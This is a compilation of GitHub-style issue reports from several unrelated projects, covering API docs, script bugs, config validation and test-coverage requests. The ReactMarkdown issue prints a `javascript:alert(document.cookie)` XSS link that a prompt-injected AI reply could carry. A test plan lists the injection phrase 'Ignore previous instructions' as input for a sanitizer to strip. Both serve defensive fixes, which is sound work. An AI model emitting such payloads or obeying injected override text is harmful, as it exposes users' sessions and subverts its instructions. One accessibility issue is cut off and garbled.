2. Run `flake8 --select=F811 src/` across the repo to check for similar duplicate definitions elsewhere.
3. Add `F811` to the project's flake8 config (`.flake8` or `setup.cfg`) to prevent regressions.

issues.title: [FEATURE] Enable Swagger/OpenAPI documentation — currently permanently commented out
issues.body:
## Current Problem

The project has a `swaggerConfig.js` file and `swagger-ui-express` wired up, but both the import and the route registration are commented out in `server/index.js`:

\`\`\`js
// server/index.js line 22
// import swaggerSpec from "./src/config/swaggerConfig.js";

// server/index.js line 198
// app.use("/api-docs", swaggerUi.serve, swaggerUi.setup(swaggerSpec));
\`\`\`

As a result, there is **no API documentation** accessible anywhere in the project. The backend exposes 15+ route modules:

- `auth`, `users`, `resumes`, `jobs`, `matching`, `notifications`
- `interviews`, `classrooms`, `roadmap`, `analytics`
- `recruiter`, `coverLetters`, `files`, `dashboard`, `ai-assistant`

Contributors and frontend developers currently have to read through every controller file individually to understand the API surface. For a growing GSSoC open-source project, this significantly raises the barrier to contribution.

## Proposed Solution

1. Uncomment the Swagger import and route in `server/index.js`:

\`\`\`js
import swaggerSpec from "./src/config/swaggerConfig.js";
// ...
app.use("/api-docs", swaggerUi.serve, swaggerUi.setup(swaggerSpec));
\`\`\`

2. Verify `server/src/config/swaggerConfig.js` is complete and loads without errors

3. Add `@openapi` JSDoc annotations to at least the core auth and resume routes as a starting point — for example:

\`\`\`js
/**
 * @openapi
 * /api/auth/login:
 *   post:
 *     summary: Authenticate a user and return a JWT
 *     requestBody:
 *       required: true
 *       content:
 *         application/json:
 *           schema:
 *             type: object
 *             properties:
 *               email:
 *                 type: string
 *               password:
 *                 type: string
 *     responses:
 *       200:
 *         description: Login successful
 *       401:
 *         description: Invalid credentials
 */
\`\`\`

4. Add a note to the README pointing contributors to `/api-docs`

## Expected Impact

- Contributors can browse all API endpoints at `http://localhost:5000/api-docs` without reading source code
- Frontend developers can view request/response schemas, required fields, and error codes in one place
- New GSSoC contributors have a clear reference for adding new endpoints consistently
- The existing `swaggerConfig.js` infrastructure is not wasted

## Implementation Ideas

- Gate the `/api-docs` route behind `process.env.NODE_ENV !== "production"` if full public exposure is not desired
- Use `swagger-jsdoc` (already referenced in the config) with `@openapi` annotations directly on route files
- A minimal first PR could just uncomment the two lines and verify the UI loads — documentation can be filled in incrementally

## Alternatives Considered

Leaving the documentation commented out means contributors must reverse-engineer every route from controller code. Given the project already has `swagger-ui-express` and `swagger-jsdoc` in its dependencies, enabling it is a low-effort, high-value change.

[BUG] ReactMarkdown renders AI responses without rehype-sanitize — javascript: href links pass through
issues.body:
## Description

`MessageBubble.jsx` uses `ReactMarkdown` to render all bot AI responses without a sanitization plugin. While `react-markdown` does not use `dangerouslySetInnerHTML` by default, it still allows crafted `javascript:` scheme links to pass through unblocked. For example, a malicious or prompt-injected AI response containing:

\`\`\`markdown
[click here](javascript:alert(document.cookie))
\`\`\`

...renders a clickable anchor tag with a `javascript:` href, which executes when the user clicks it.

Additionally, there is no `rehype-sanitize` plugin installed or passed via `rehypePlugins`, meaning any future enabling of `allowDangerousHtml` (a common incremental change in OSS) would instantly open full XSS on the chat panel.

**Affected file:** `client/src/modules/ai-assistant/components/MessageBubble.jsx` (lines 35–50)

\`\`\`jsx
// Line 35 — no rehypePlugins passed at all
<ReactMarkdown
  components={{ ... }}
>
  {text}   {/* raw AI API response, not sanitized */}
</ReactMarkdown>
\`\`\`

## Reproduction Steps

1. Open the AI assistant chat widget (floating button, bottom-right)
2. Send a message that causes the bot to echo or include markdown like `[click](javascript:alert(1))`
3. Observe that the rendered response contains a clickable `javascript:` link

## Expected Behavior

All rendered markdown links should be sanitized so that `javascript:` scheme URLs are stripped or replaced with `#`. Bot responses should never produce executable JavaScript via rendered anchor tags.

## Screenshots / Logs

No screenshot needed — the issue is structural: `rehype-sanitize` is absent from the dependency list and from the `ReactMarkdown` component usage.

## Environment Details

- File: `client/src/modules/ai-assistant/components/MessageBubble.jsx`
- Package: `react-markdown` (installed, no sanitizer plugin)
- `rehype-sanitize`: not installed

## Additional Context

**Suggested fix:**

\`\`\`bash
npm install rehype-sanitize
\`\`\`

\`\`\`jsx
import rehypeSanitize from "rehype-sanitize";

<ReactMarkdown
  rehypePlugins={[rehypeSanitize]}
  components={{ ... }}
>
  {text}
</ReactMarkdown>
\`\`\`

This strips disallowed HTML and `javascript:` scheme links from rendered markdown output, providing defence-in-depth against prompt-injected or malicious AI responses.

issues.title: 🐛 [Bug]: Fake News Headline Generator silently generates a new headline on invalid input instead of re-prompting, and offers no alternative exit keywords
issues.body:
### 📝 Description

When the user enters anything other than `"yes"` or `"no"` at the continuation prompt in Fake News Headline Generator, the script prints an invalid-input message but then immediately falls through to generate another headline without asking the user again. Additionally, common exit keywords like `"n"`, `"quit"`, or `"exit"` are not recognised as valid ways to stop, trapping the user in the loop.

**File:** `utilities/Fake-News-Headline-Generator/Fake-News-Headline-Generator.py`

```python
user_input = input("DO YOU WANT ANOTHER HEADLINE? (YES/NO): ").strip().lower()

if user_input == "no":
    break

if user_input not in ["yes", "no"]:
    print("INVALID INPUT. GENERATING ANOTHER HEADLINE...")
    # falls through — a new headline is generated without user consent
```

### 🔄 Steps to Reproduce

1. Run `utilities/Fake-News-Headline-Generator/Fake-News-Headline-Generator.py`
2. After the first headline, type `"y"` (instead of `"yes"`) and press Enter
3. Observe: the script prints `"INVALID INPUT. GENERATING ANOTHER HEADLINE..."` and generates one anyway
4. Try typing `"quit"` or `"exit"` — the script treats them the same as `"yes"` and keeps generating headlines
5. The only way to stop is to type exactly `"no"` or use Ctrl+C

### 🎯 Expected Behavior

- Invalid input should re-prompt the user rather than silently proceeding
- Common alternatives (`"y"`, `"n"`, `"quit"`, `"exit"`, `"q"`) should be recognised
- The fix:

```python
while True:
    user_input = input("DO YOU WANT ANOTHER HEADLINE? (YES/NO): ").strip().lower()
    if user_input in ["no", "n", "exit", "quit", "q"]:
        break
    elif user_input in ["yes", "y"]:
        break   # outer loop continues to next headline
    else:
        print("INVALID INPUT. Please type YES or NO.")
        # re-prompts instead of generating a headline
```

### ❌ Actual Behavior / Error Logs

- Typing `"y"`, `"quit"`, `"stop"`, or any non-`"no"` string silently generates another headline.
- Users have no graceful exit path other than the exact string `"no"` or a keyboard interrupt (`Ctrl+C`).

### 💻 Environment

- **OS:** Cross-platform
- **Python Version:** All supported versions
- **File Name:** `utilities/Fake-News-Headline-Generator/Fake-News-Headline-Generator.py`

---
- [x] I am a registered **GSSoC 2026** contributor.
- [x] I want to be assigned to fix this issue.

issues.title: 🐛 [Bug]: Typing Speed Tester accuracy metric is misleading — conflates character accuracy with prompt completion
issues.body:
### 📝 Description

The accuracy calculation in Typing Speed Tester produces a misleading result by dividing correctly typed characters by the total length of the *original prompt*, rather than the length of what the user actually typed. This conflates two separate metrics — character-level accuracy and prompt completion — into a single number that misrepresents both.

**File:** `utilities/Typing-Speed-Tester/Typing-Speed-Tester.py`, lines 63–69

```python
correct_chars = 0
for i in range(min(len(sentence), len(typed_text))):
    if sentence[i] == typed_text[i]:
        correct_chars += 1

accuracy = (correct_chars / len(sentence)) * 100   # ← divides by prompt length, not typed length
```

### 🔄 Steps to Reproduce

1. Run `utilities/Typing-Speed-Tester/Typing-Speed-Tester.py`
2. When the prompt appears, type only the **first half** of the sentence perfectly, then press Enter
3. Observe: accuracy reports ~50% even though every character you typed was correct
4. Alternatively, type the full sentence correctly but add a trailing space — accuracy still shows 100% despite the extra character

### 🎯 Expected Behavior

Two separate metrics should be reported:
- **Typing Accuracy** — what percentage of the characters the user typed were correct (`correct_chars / len(typed_text) * 100`)
- **Completion** — what percentage of the full prompt was covered (`len(typed_text) / len(sentence) * 100`)

Example output:
```
🎯 Typing Accuracy : 98.00%   (of what you typed)
📏 Completion      : 100.00%  (of the full prompt)
```

### ❌ Actual Behavior / Error Logs

- A user who types the first 10 characters of a 100-character prompt with zero errors sees `10% accuracy` — misleadingly implying they typed badly.
- A user who types extra characters beyond the prompt end gets no penalty — those characters are silently ignored.

issues.title: 🐛 [Bug]: Budget Tracker and Productivity Pet save data to current working directory instead of script directory, causing silent data loss
issues.body:
### 📝 Description

Both Budget Tracker and Productivity Pet use bare filenames for their persistent data files, which means the data is saved to whatever directory the user is in when they run the script — not the script's own directory. Running the script from different locations creates multiple disconnected data files and silently loses previously saved data.

**Affected files and lines:**
- `utilities/Budget-Tracker/budget_tracker.py`, line 10: `DATA_FILE = "budget_data.csv"`
- `utilities/Productivity-Pet/Productivity-Pet.py`: `SAVE_FILE = "save.json"`

### 🔄 Steps to Reproduce

**For Budget Tracker:**
1. From your home directory, run: `python Documents/python-mini-project/utilities/Budget-Tracker/budget_tracker.py`
2. Add a few income/expense entries — `budget_data.csv` is created in `~/` (home directory)
3. Change into the project folder: `cd Documents/python-mini-project/utilities/Budget-Tracker/`
4. Run the script again: `python budget_tracker.py`
5. All previous entries are gone — a new empty `budget_data.csv` is created here instead

**For Productivity Pet:**

### 🎯 Expected Behavior

Data files should always be saved in the same directory as the script itself, regardless of where the user runs it from. The fix is a one-liner using `__file__`:

```python
import os
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATA_FILE = os.path.join(BASE_DIR, "budget_data.csv")
```

### ❌ Actual Behavior / Error Logs

- Budget transaction history is silently lost when the script is run from a different working directory.
- Productivity Pet progress (XP, level, streak, pet class choice) resets to zero, re-prompting the user to choose a pet class they already selected.

issues.title: 🐛 [Bug]: Prime Number Analyzer accepts unbounded input causing memory exhaustion and program hang
issues.body:
### 📝 Description

The Prime Number Analyzer accepts arbitrarily large integers for options 2, 3, and 5 with no upper-bound validation. This causes the program to attempt allocating a massive boolean list in memory, hanging or crashing the process entirely.

### 🔄 Steps to Reproduce

1. Run `math/Prime-Number-Analyzer/Prime-Number-Analyzer.py`
2. Select option `2` ("Generate prime numbers up to N")
3. Enter `1000000000` (1 billion)
4. Observe the program freeze as it tries to allocate `[True] * 1_000_000_001`

The same issue exists in:
- **Option 3** ("Find primes in a range") — uses the same sieve with no cap on `end`
- **Option 5** ("Find Nth prime") — doubles its internal `limit` in a `while True` loop with no ceiling:

```python
limit = 100
while True:
    prime = [True] * (limit + 1)   # grows unboundedly
    ...
    limit *= 2   # no maximum — doubles forever
```

### 🎯 Expected Behavior

The script should validate that the input does not exceed a safe maximum (e.g. 10,000,000) and display a clear error message if it does:

```
❌ Limit too large. Maximum allowed: 10,000,000. Please enter a smaller value.
```

### ❌ Actual Behavior / Error Logs

- Entering a large value (e.g. 10^9) causes the program to hang indefinitely consuming all available RAM.
- On machines with limited memory, it raises `MemoryError` with no user-friendly message.
- Option 5's doubling loop has no exit condition beyond finding enough primes, so for very large `n` values it may run for minutes.

### 💻 Environment

- **OS:** Cross-platform (Windows, macOS, Linux)
- **Python Version:** All supported versions
- **File Name:** `math/Prime-Number-Analyzer/Prime-Number-Analyzer.py` (lines 54–78, 94–121, 184–205)

issues.title: 🐛 [Bug]: Missing `if __name__ == '__main__'` guard in 41 scripts breaks testability and import safety
issues.body:
### 📝 Description

41 out of ~52 Python scripts in the repository lack the standard `if __name__ == "__main__":` guard. This means every script executes its full logic — including `input()` calls, game loops, and API requests — the moment it is imported or analyzed by any tool.

Affected directories: `games/`, `math/`, `utilities/` (sample list):
- `games/Number-Guessing-Game/Number-Guessing-Game.py`
- `games/Tic-Tac-Toe/Tic-Tac-Toe.py`
- `math/Prime-Number-Analyzer/Prime-Number-Analyzer.py`
- `math/Quadratic-Solver/Quadratic-Solver.py`
- `utilities/Typing-Speed-Tester/Typing-Speed-Tester.py`
- `utilities/Fake-News-Headline-Generator/Fake-News-Headline-Generator.py`
- *(and 35 more)*

### 🔄 Steps to Reproduce

1. Open any of the affected scripts, e.g. `math/Prime-Number-Analyzer/Prime-Number-Analyzer.py`
2. Try to import it from another Python file: `import Prime-Number-Analyzer`
3. Observe the full game/script starts executing immediately, blocking on `input()`

Or look at the test suite — `tests/test_number_guessing.py` is forced to use this fragile workaround because there is no importable `main()`:
```python
with open(self.script_path, 'r', encoding='utf-8') as f:
    exec(f.read(), {'__name__': '__main__'})
```

### 🎯 Expected Behavior

Each script should wrap its top-level logic in a `main()` function guarded by:
```python
def main():
    # existing script logic here

if __name__ == "__main__":
    main()
```

This is a foundational Python best practice. Running the script directly (`python script.py`) should work identically, but importing the file should not trigger any side effects.

### ❌ Actual Behavior / Error Logs

- Scripts execute immediately on import, triggering `input()` prompts and blocking any tool that tries to analyze the file.
- The test suite is forced to use `exec()` hacks with `try/except StopIteration` guards, which is fragile and hard to maintain.
- Linters, type-checkers (mypy), and documentation generators may hang or crash when processing these files.

### 💻 Environment

- **OS:** Cross-platform (affects all OSes)
- **Python Version:** All supported versions
- **File Name:** 41 scripts across `games/`, `math/`, `utilities/`

issues.title: Bug: focus_time_this_week never resets — accumulates lifetime total, displayed as a weekly metric
issues.body:
### Description

The `FocusTimer` component adds completed work-session minutes to a `focus_time_this_week` column in `profiles` on every session completion. However, no cron job, database trigger, or scheduled function ever resets this value. The Dashboard displays it as a weekly stat — "X hrs focused" — but it is actually a monotonically increasing lifetime total. After a few weeks of use the displayed number becomes meaningless.

### Affected Files

- `src/components/FocusTimer.tsx` — accumulation logic (~lines 71–73, 93)
- `src/pages/Dashboard.tsx` — display label (~line 374)
- `backend/controllers/cronController.js` — cron tasks (no weekly reset task exists)

### Root Cause

```ts
// FocusTimer.tsx — on work session complete:
const newFocusTime = focusTimeThisWeek + workDuration;
setFocusTimeThisWeek(newFocusTime);
await updateProfile(false, newFocusTime); // written to DB, never cleared
```

```tsx
// Dashboard.tsx — displayed as a weekly figure:
⏱️ {Math.round(profile?.focus_time_this_week / 60) ?? 0} hrs focused
```

The cron controller at `backend/controllers/cronController.js` handles notification dispatch and session-reminder tasks but contains no task to reset `focus_time_this_week`.

### Impact

- Users see an ever-growing number labeled as their weekly focus time, which is misleading and undermines trust in the gamification system.
- Any feature built on top of this field (e.g., weekly challenges, streaks, leaderboard rankings by focus time) will produce incorrect results.

### Proposed Fix

**Option A — Add a weekly reset cron task** (preserves the "this week" semantics):

1. Add a new route `POST /api/cron/reset-weekly-focus` in `backend/routers/cronRoutes.js`.
2. In the handler, run:
   ```sql
   UPDATE profiles SET focus_time_this_week = 0;
   ```
3. Schedule it to fire every Monday at 00:00 UTC via the existing cron infrastructure.

**Option B — Rename the field** (if lifetime tracking was always the intent):

Rename `focus_time_this_week` to `focus_time_total` in the database, types, component, and dashboard label so the displayed value matches what is actually stored.

Bug: Navbar queries non-existent 'users' table — profile name never loads
issues.body:
### Description

The Navbar fetches the logged-in user's display name from a `users` table that does not exist in the public schema. The query fails silently, `profileName` is never set, and every authenticated user always sees `"User"` as their name in the top-right navigation widget. The same incorrect table reference appears in two other files.

### Affected Files

- `src/components/Navbar.tsx` — `fetchProfile` function (~line 60)
- `src/hooks/useMessages.ts` — sender name lookup (~line 170)
- `src/pages/Chat.tsx` — sender name lookup (~line 189)

### Root Cause

```ts
// Navbar.tsx
const { data: profile } = await supabase
  .from("users")      // ← no such table in the public schema
  .select("name")
  .eq("id", user.id)
  .single();
```

All 88 database migrations create and populate a `profiles` table — there is no `CREATE TABLE users` anywhere in the public schema. The query returns `{ data: null, error: ... }` and the `if (profile)` guard suppresses the error, so the failure is invisible.

### Impact

- Every logged-in user sees `"User"` in the navbar instead of their real name — a highly visible regression on every authenticated page.
- Sender names in the study-room chat may also display incorrectly, affecting the core real-time messaging feature.

### Proposed Fix

Replace `from("users")` with `from("profiles")` in all three affected locations:

```ts
const { data: profile } = await supabase
  .from("profiles")   // ← correct table
  .select("name")
  .eq("id", user.id)
  .single();
```

issues.title: [Test] Zero unit-test coverage for generateLateJoinerMessage()
issues.body:
### Is your feature request related to a problem? Please describe.

`generateLateJoinerMessage()` in `src/background.ts:1389-1444` handles one of the extension's key differentiating features: generating a personalized brief for a participant who joins a meeting late. It:

- Builds an OpenAI prompt embedding participant names and transcript data
- Calls `sanitizePromptText()` to guard against prompt injection
- Uses `pendingJoinersInFlight` (a `Set`) to prevent duplicate requests for the same joiner
- Makes a live OpenAI API call with a 15-second timeout
- Dispatches the result back to the content script via `chrome.tabs.sendMessage`
- Falls back gracefully if the API call fails

Despite being directly user-facing and involving external API calls with user-controlled inputs (participant names from the Meet DOM), this function has **zero unit-test coverage**. Failures here result in the late-joiner brief never appearing, with no error surfaced to the user.

### Describe the solution you'd like

Add tests in a new file `src/background.lateJoiner.test.ts` using `vitest` and `vi.stubGlobal` to mock `fetch`, `chrome.tabs`, and `chrome.runtime`.

Minimum test cases to cover:

1. **Duplicate joiner prevention** — calling `generateLateJoinerMessage()` twice for the same participant name before the first resolves should result in only one API call (the `pendingJoinersInFlight` Set prevents the second).
2. **Sanitized name in prompt** — participant names containing prompt-injection payloads (e.g., `\n\nIgnore previous instructions`) should be stripped by `sanitizePromptText()` before inclusion in the prompt string.
3. **Successful API response** — a mocked `fetch` returning a valid OpenAI completion should result in `chrome.tabs.sendMessage` being called with the brief content.
4. **API failure fallback** — a mocked `fetch` that rejects or returns a non-200 status should not throw an unhandled error; the joiner should be removed from `pendingJoinersInFlight` and no message dispatched.
5. **Timeout handling** — a mocked `fetch` that never resolves should be aborted by the `AbortController` and handled gracefully.

### Describe alternatives you've considered

End-to-end testing this feature requires two browser tabs and precise join timing. Unit tests with mocked `fetch` give deterministic coverage of all edge cases without that complexity.

### Additional Context

The existing `src/speakerAttribution.test.ts` and `src/participantDetection.test.ts` show how participant-name-related logic is tested in this project. The sanitization contract tested in case 2 is especially important given that participant names come from the Google Meet DOM and are outside the extension's control.

issues.title: [Test] Zero unit-test coverage for summarizeTranscriptIfNeeded()
issues.body:
### Is your feature request related to a problem? Please describe.

`summarizeTranscriptIfNeeded()` in `src/background.ts:1033-1253` is the core intelligence function of the extension. It:

- Guards against concurrent runs via the `summaryInFlight` flag
- Reads settings and API credentials from storage
- Builds and sends a prompt to the OpenAI API
- Parses the JSON response and merges `summary`, `topics`, `decisions`, `actionItems`, `insights`, `discussions`, `contradictions`, and `sentimentScore` into in-memory state
- Persists the updated session to storage
- Controls the summarization interval timer

Despite being the most complex and consequential function in the codebase, it has **zero unit-test coverage**. Regressions in JSON parsing, field merging, the in-flight guard, or the interval throttle are only discoverable in production during a live meeting.

### Describe the solution you'd like

Add a test file `src/background.summarization.test.ts` (following the naming convention of existing test files) using `vitest` and `vi.stubGlobal` to mock `fetch` and `chrome.storage`.

Minimum test cases to cover:

1. **Early return on empty transcript** — `summarizeTranscriptIfNeeded()` should return without making an API call when `state.transcript` is empty.
2. **Interval throttle** — should return without an API call when less than `intervalSeconds` have elapsed since `state.lastSummarizedAt`.
3. **`summaryInFlight` guard** — setting `summaryInFlight = true` before calling should cause immediate return.
4. **Successful summary merge** — a mocked successful API response with a valid JSON body should result in `state.summary`, `state.topics`, and `state.actionItems` being updated correctly.
5. **`summaryInFlight` reset in `finally`** — after a successful or failed API call, `summaryInFlight` should be `false`.
6. **JSON parse failure** — if the API returns malformed JSON, `summaryInFlight` should still be reset and the error should be caught without crashing the worker.

### Describe alternatives you've considered

These scenarios could be caught by end-to-end tests, but E2E tests are slow and cannot easily simulate specific race conditions or API failures. Unit tests with mocked `fetch` are the right tool here.

### Additional Context

The existing test files (`src/audioChunkQueue.test.ts`, `src/sessionStorage.test.ts`, `src/speakerAttribution.test.ts`) demonstrate the testing patterns and mock setup already used in this project. The new test file should follow the same conventions.

[BUG] MyHealth.tsx accesses jsPDF via window as any (CDN global) with no declared npm dependency and no graceful fallback
issues.body:
**Describe the bug**

In `client/src/pages/MyHealth.tsx` (line ~147), the PDF download feature accesses the `jsPDF` library as a global on `window`:

```ts
function handleDownloadPdf(assessment: Assessment) {
  const { jsPDF } = window as any;
  if (!jsPDF) {
    setError("PDF library not loaded.");
    return;
  }
  const doc = new jsPDF();
  ...
}
```

This pattern has several problems:

**1. Undeclared dependency**

`jspdf` does not appear in `package.json`. The library is expected to be loaded via a CDN `<script>` tag at runtime. This means:
- The package is invisible to the build system, bundler, and dependency auditing tools.
- No version is pinned — a CDN outage or breaking change silently breaks the feature.
- `npm audit` cannot flag vulnerabilities in this version.

**2. CSP incompatibility**

The project recently hardened its Content Security Policy (PR #1103). External CDN script sources require an explicit `script-src` allowlist entry. If that entry is missing or the CDN domain changes, `jsPDF` will be blocked and the feature silently fails.

**3. Unhelpful error message**

"PDF library not loaded." gives the user no actionable guidance. They cannot know whether to refresh, check their network, or contact support.

**4. `window as any` bypasses TypeScript type checking**

`new jsPDF()` is untyped — method calls like `doc.setFontSize()`, `doc.text()`, and `doc.save()` have no type safety. Typos or API changes go undetected until runtime.

**To Reproduce**

1. Block the CDN domain serving jsPDF (via browser DevTools > Network tab > Block request URL)
2. Open the MyHealth page and click "Download PDF" on any assessment
3. Observe the generic "PDF library not loaded." error with no recovery path

**Expected behavior**

The PDF generation should work reliably in all environments (offline-capable PWA, strict CSP, no CDN access) and should be type-safe.

**Suggested fix**

Install `jspdf` as a proper npm dependency:
```bash
npm install jspdf
npm install --save-dev @types/jspdf
```

Then import it directly:
```ts
import jsPDF from "jspdf";

function handleDownloadPdf(assessment: Assessment) {
  const doc = new jsPDF();
  doc.setFontSize(18);
  ...
}
```

Remove the CDN `<script>` tag (if present in `index.html`) and the `window as any` cast entirely.

**Additional context**

The rest of the codebase uses proper npm imports for all other libraries (Recharts, React Query, Zod, etc.). This CDN-global pattern is inconsistent with the project's module system.

issues.title: [A11Y] Topics list in popup uses div elements without list semantics

### Description The topics list in the extension popup (`src/popup.ts:671-684`) is rendered as a series of `
` elements injected into `#topics-list` (also a `
`): ```ts topicsList.innerHTML = state.topics .map( (t) => `

[Bug]: DEVICE Config Value Not Validated Against Allowed Backends, Causing Cryptic Runtime Failure
issues.body:
## Short Descriptive Title
`DEVICE` Config Value Not Validated Against Allowed Backends, Causing Cryptic Runtime Failure

## Detailed Description

**File:** `src/config.py`

`src/config.py` has thorough validation for `SECRET_KEY` (length, entropy checks) but performs no validation on the `DEVICE` field, which selects the PyTorch compute backend (`cpu`, `cuda`, or `mps`).

An invalid value — e.g., `DEVICE=gpu` (a common mistake; the correct value is `cuda`) — passes config loading silently. The error only surfaces later as a cryptic PyTorch `RuntimeError` deep inside model initialization:

```
RuntimeError: Invalid device string: 'gpu'
```

At that point the stack trace points into PyTorch internals, giving the operator no indication that the root cause is a one-character typo in the environment configuration.

**Affected groups:**
- Contributors setting up on Apple Silicon who write `DEVICE=mps` but misspell it
- Operators deploying on CPU-only infrastructure who write `DEVICE=gpu` instead of `cpu`
- CI environments where the variable may be unset or inherited incorrectly

Issue #598 covers missing required config *sections*. This issue is specifically about validating the *value* of `DEVICE` against the known-valid set.

## Proposed Solution / Implementation Plan

Add a Pydantic field validator (or `__post_init__` check) in `src/config.py`:

```python
VALID_DEVICES = {"cpu", "cuda", "mps"}

@field_validator("DEVICE")
@classmethod
def validate_device(cls, v: str) -> str:
    v = v.strip().lower()
    if v not in VALID_DEVICES:
        raise ValueError(
            f"DEVICE must be one of {sorted(VALID_DEVICES)}, got {v!r}. "
            "Use 'cuda' for NVIDIA GPUs, 'mps' for Apple Silicon, 'cpu' otherwise."
        )
    return v
```

Steps:
1. Add the validator to the config class in `src/config.py`
2. Also add `.strip().lower()` normalization so `DEVICE=CPU` or `DEVICE= cuda ` work without error
3. Add unit tests: valid values (`cpu`, `cuda`, `mps`), invalid values (`gpu`, `GPU`, ``, `tpu`), edge cases with whitespace
4. Update `.env.example` to document the three valid values with a comment

[Bug]: CORS ALLOWED_ORIGINS Accepts Malformed URLs Without Validation, Causing Silent Misconfiguration
issues.body:
## Short Descriptive Title
`ALLOWED_ORIGINS` Accepts Malformed URLs Without Validation, Causing Silent Misconfiguration

## Detailed Description

**File:** `src/api/security.py`, `.env.example` (line 21)

`ALLOWED_ORIGINS` is parsed from a comma-separated environment variable and passed directly to FastAPI's `CORSMiddleware` without validating that each entry is a well-formed URL. Malformed entries such as:

- `https://` (missing host)
- `not-a-url`
- `https: //example.com` (whitespace typo)
- `http://example.com/path` (path component, invalid for CORS origins)

...are silently accepted. Starlette's CORS middleware then either matches nothing (blocking all legitimate cross-origin requests) or behaves unpredictably depending on string comparison logic.

**Why this matters in a security-critical system:**

1. A single typo in `ALLOWED_ORIGINS` can silently break the frontend for all users with no actionable error.
2. In the opposite direction, a permissive typo could weaken CORS enforcement — e.g., `https://` matches as a prefix of any HTTPS origin in some middleware implementations.
3. Misconfiguration is not caught at startup, making it hard to diagnose in production.

## Proposed Solution / Implementation Plan

Validate each origin at application startup using `urllib.parse`:

```python
from urllib.parse import urlparse

def _parse_and_validate_origins(raw: str) -> list[str]:
    origins = [o.strip() for o in raw.split(",") if o.strip()]
    for origin in origins:
        parsed = urlparse(origin)
        if parsed.scheme not in ("http", "https"):
            raise ValueError(f"CORS origin must use http or https scheme: {origin!r}")
        if not parsed.netloc:
            raise ValueError(f"CORS origin is missing a host: {origin!r}")
        if parsed.path and parsed.path != "/":
            raise ValueError(f"CORS origin must not include a path component: {origin!r}")
    return origins
```

Steps:
1. Add `_parse_and_validate_origins()` to `src/api/security.py`
2. Call it during app startup (FastAPI lifespan or settings validation) so invalid config causes an immediate startup failure with a clear message
3. Add unit tests for: valid origins, missing scheme, missing host, extra path, whitespace typos, wildcard `*`
4. Update `.env.example` with a comment documenting the expected format

[BUG] Duplicate rate-limiter import and re-declaration in assessments.routes.ts creates two conflicting limiter instances
issues.body:
**Describe the bug**

`server/routes/assessments.routes.ts` both imports `assessmentLimiter` and `previewLimiter` from the shared middleware file and then re-declares them as local exports with the same names in the same file.

Line 10 — imported from shared location:
```ts
import { assessmentLimiter, previewLimiter } from "../middleware/rateLimit";
```

Lines 45-67 — immediately redeclared as new local exports:
```ts
export const assessmentLimiter = rateLimit({ windowMs: 60 * 1000, limit: 5, ... });
export const previewLimiter    = rateLimit({ windowMs: 60 * 1000, limit: 10, ... });
```

This has three consequences:

1. **TypeScript compile error** — duplicate identifier. `tsc --noEmit` will reject the file because both names are declared twice in the same scope.
2. **Two separate rate-limit instances** — at runtime the imported instance and the local instance each maintain their own in-memory hit counter, effectively doubling the allowed request rate.
3. **Import is dead code** — the local declaration shadows the import. The shared definitions in `middleware/rateLimit.ts` are imported but never used.

**To Reproduce**

```bash
npx tsc --noEmit
# Expected: error TS2300: Duplicate identifier 'assessmentLimiter'
```

**Expected behavior**

Each rate limiter should be defined exactly once in `server/middleware/rateLimit.ts` and only imported everywhere else.

**Suggested fix**

Remove the local `export const assessmentLimiter` and `export const previewLimiter` re-declarations (lines ~45-67) from `assessments.routes.ts` and rely solely on the imported versions from `../middleware/rateLimit`.

**Additional context**

Issue #1170 documents a similar duplicate-declaration problem in the top-level `server/routes.ts`. This is a separate occurrence in the modular router file. The same pattern should be audited in other route files to ensure no further shadowed imports exist.

issues.title: [Bug]: ThreadPoolExecutor in ProductionFraudScorer Uses Fragile __del__ for Cleanup, Causing Resource Leaks
issues.body:
## Short Descriptive Title
`ThreadPoolExecutor` in `ProductionFraudScorer` Uses Fragile `__del__` for Cleanup, Causing Resource Leaks

## Detailed Description

**File:** `src/inference/production_scorer.py` (~lines 100, 584)

`ProductionFraudScorer.__init__` creates a `ThreadPoolExecutor` but relies on `__del__` for shutdown. Python's garbage collector does not guarantee when `__del__` is called — under reference cycles or non-CPython runtimes it may never run before interpreter shutdown.

**Concrete problems this causes:**

1. **Thread leak on model reloads** — In hot-swap workflows, the old scorer instance may not be collected before the new one starts. Old executor threads stay alive holding GPU context or file handles.
2. `shutdown(wait=False)` does not drain pending futures — inference may be abandoned mid-computation producing corrupted partial results.
3. **No warning to callers** — The leak is silent. No `ResourceWarning` is emitted.

This is distinct from issue #1026 (singleton construction thread-safety). This issue is about lifecycle and cleanup.

## Proposed Solution / Implementation Plan

Make `ProductionFraudScorer` a proper context manager:

```python
def __enter__(self):
    return self

def __exit__(self, *args):
    self.close()

def close(self):
    if not self._closed:
        self._executor.shutdown(wait=True)
        self._closed = True

def __del__(self):
    if not self._closed:
        import warnings
        warnings.warn(
            f"{type(self).__name__} was not explicitly closed.",
            ResourceWarning, stacklevel=2,
        )
        self._executor.shutdown(wait=False)
```

Steps:
1. Add `__enter__`, `__exit__`, `close()` to `ProductionFraudScorer`
2. Update `__del__` to emit `ResourceWarning` as a last resort
3. Update call sites (FastAPI lifespan, tests) to use context manager or explicit `.close()`
4. Add a test verifying no threads remain alive after `.close()`
